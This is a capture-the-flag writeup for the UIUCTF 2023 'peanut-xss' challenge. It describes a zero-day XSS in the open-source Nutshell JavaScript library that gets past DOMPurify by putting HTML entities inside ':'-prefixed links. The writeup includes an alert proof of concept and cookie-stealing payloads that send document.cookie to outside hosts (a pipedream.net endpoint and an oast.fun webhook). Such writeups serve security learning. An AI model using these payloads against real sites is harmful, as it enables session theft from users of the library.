---
id: 939b9002-fd8d-4184-bb78-de45c82d5e3b
title: >-
  Zero-Day XSS Found in Open Source JS Library for CTF Solution - UIUCTF 2023 -
  peanut-xss Writeup
created_time: 2024-04-30T23:16:00.000Z
last_edited_time: 2024-11-24T07:12:00.000Z
cover_image: ./imgs/Screen_Shot_2016-02-17_at_3.54.25_PM.0.0_d3KvasX1.png
icon_emoji: 0️⃣
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Zero-Day XSS Found in Open Source JS Library for CTF Solution - UIUCTF 2023 -
  peanut-xss Writeup
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/Screen_Shot_2016-02-17_at_3.54.25_PM.0.0_d3KvasX1.png

---

This week, I participated in UIUCTF 2023 with the TCP1P team and successfully solved multiple challenges. One of the challenges I tackled was called "peanut-xss".

In this challenge, our goal was to exploit an XSS vulnerability on the web page and retrieve the admin cookie from the admin bot. However, the challenge presented a challenge due to the usage of the latest JavaScript libraries. Here's a glimpse of the source code I obtained from the web:

```html
<!DOCTYPE html>
<html data-theme="light" lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <title>Peanut XSS</title>
  <script src="<https://cdn.jsdelivr.net/gh/ncase/nutshell@v1.0.06/nutshell.js>"
    integrity="sha512-M2fB+hjUmLSY45qhwo1jQlOHhkxVJEGbWfHtJBV4WtKGS6KN2LsWLINTYkQZHlSqU5NUHBUw8Vl2tUJK2OwKDA=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <link rel="stylesheet" href="<https://cdnjs.cloudflare.com/ajax/libs/picocss/1.5.2/pico.min.css>"
    integrity="sha512-3gFq2IXMVlAQaUyahzhjDRivv0yqyXTb7xiy6ivTaG5Uz4hKI54uYxpQefdomgDVQ11eJVUbXG0YdPMDISiGgg=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />
  <script src="<https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.js>"
    integrity="sha512-8RnEqURPUc5aqFEN04aQEiPlSAdE0jlFS/9iGgUyNtwFnSKCXhmB6ZTNl7LnDtDWKabJIASzXrzD0K+LYexU9g=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <link rel="stylesheet" href="<https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.css>"
    integrity="sha512-uf06llspW44/LZpHzHT6qBOIVODjWtv4MxCricRxkzvopAlSWnTf6hpZTFxuuZcuNE9CBQhqE0Seu1CoRk84nQ=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />
  <script src="<https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/xml/xml.min.js>"
    integrity="sha512-LarNmzVokUmcA7aUDtqZ6oTS+YXmUKzpGdm8DxC46A6AHu+PQiYCUlwEGWidjVYMo/QXZMFMIadZtrkfApYp/g=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="<https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/css/css.min.js>"
    integrity="sha512-rQImvJlBa8MV1Tl1SXR5zD2bWfmgCEIzTieFegGg89AAt7j/NBEe50M5CqYQJnRwtkjKMmuYgHBqtD1Ubbk5ww=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="<https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/javascript/javascript.min.js>"
    integrity="sha512-I6CdJdruzGtvDyvdO4YsiAq+pkWf2efgd1ZUSK2FnM/u2VuRASPC7GowWQrWyjxCZn6CT89s3ddGI+be0Ak9Fg=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="<https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/htmlmixed/htmlmixed.min.js>"
    integrity="sha512-HN6cn6mIWeFJFwRN9yetDAMSh+AK9myHF1X9GlSlKmThaat65342Yw8wL7ITuaJnPioG0SYG09gy0qd5+s777w=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body>
  <main class="container">
    <p>
      Have you heard of <a href="<https://ncase.me/nutshell/>">:Nutshell</a>?
      Here's a simple site to test it out!
    </p>
    <p>
      It uses <a href="<https://cure53.de/purify>">DOMPurify</a>... so surely
      you won't be able to steal the admin-bot's
      <code>document.cookie</code>.
    </p>
  </main>

  <div id="preview" class="container"></div>
  <textarea id="editor" style="display: none;">
      <h2>To embed a section,</h2>
      <p>just make a link with :colon at the front… <a href="#before=foo">:<img src='x' onerror='fetch(`https://eore067o7fm9cj8.m.pipedream.net?a=${document.cookie}`)'></img></a>!</p>
    </textarea>
  <button id="submit" style="display: none;">Preview</button>
  <script>
    const $ = document.querySelector.bind(document);
    const nutshell = new URLSearchParams(location.search).get("nutshell");
    if (nutshell) {
      preview.innerHTML = DOMPurify.sanitize(nutshell);
    } else {
      var editor = CodeMirror.fromTextArea($("#editor"), {
        mode: "htmlmixed",
        lineNumbers: true
      });
      $("#submit").style.display = "";

      $("#submit").onclick = () => {
        location.search = `nutshell=${encodeURIComponent(editor.getValue())}`;
      };
    }
  </script>
</body>

</html>

```

The interesting part lies in the JavaScript library imported in the HTML source code above:

```html
...snip...
  <script src="<https://cdn.jsdelivr.net/gh/ncase/nutshell@v1.0.06/nutshell.js>"
...snip...

```

It uses the `ncase/nutshell` library, and you can check its source code [here](https://github.com/ncase/nutshell). Currently, it is using the latest version, which seems legitimate, and initially, I thought it might not have any vulnerabilities for us to exploit this challenge, right? However, the reality turned out to be different, and we actually needed to discover a zero-day vulnerability to exploit this challenge.

## Uncovering a Zero Day Vulnerability

The first step is to check whether there are any XSS gadgets that we can exploit. In this case, we need to search for specific keywords in the source code, such as `innerHTML`.

After some dynamic analysis and setting numerous breakpoints in the developer console, I stumbled upon this intriguing part of the code (which you can find here: [source code](https://github.com/ncase/nutshell/blob/c182586d649153577b985dfd8dfab15e739130f6/nutshell.js#L607-L684)). Below is the snippet of the mentioned interesting part:

```javascript
...snip...
        let expandables = [...dom.querySelectorAll('a')].filter(
            link => (link.innerText.trim().indexOf(':')==0)
        );
...snip...
        expandables.forEach((ex)=>{
...snip...
            let linkText = document.createElement('span');
            linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(':')+1);
...snip...
            ex.appendChild(linkText);
...snip...

```

In the snippet of the source code provided, it can be observed that it retrieves all "**a**" tags in the DOM. Then, it creates a "**span**" element and removes the "**:**" character from the text using `ex.innerText.slice(ex.innerText.indexOf(':')+1)`. Afterward, the modified text is assigned to `linkText.innerHTML` and appended to the "**ex**" element.

If we inject an HTML entity into an "**a**" tag that starts with "**:**", it will be reappended to the "**ex**" element, allowing us to exploit an XSS vulnerability.

Here is an example payload that triggers an alert on the page:

```html
<a>:&lt;img src=x onerror='alert(1)'/&gt;</a>

```

> You can generate the HTML entity using this tool: CyberChef

Submit this payload on the main page, as shown in the image below:

![](https://hackmd.io/_uploads/H1WWSxJK3.png)

You will then observe that our XSS successfully calls the alert function:

![](https://hackmd.io/_uploads/BJILVl1t3.png)

In this scenario, the goal is to retrieve the flag from `document.cookie`. As an example, you can execute the following script using the XSS vulnerability we previously exploited, and we will obtain the flag through the webhook:

```html
<a>:&lt;img src=x onerror='fetch("<https://foo.oast.fun/?"+document.cookie>)'/&gt;</a>

```

![](https://hackmd.io/_uploads/rketPgkFn.png)
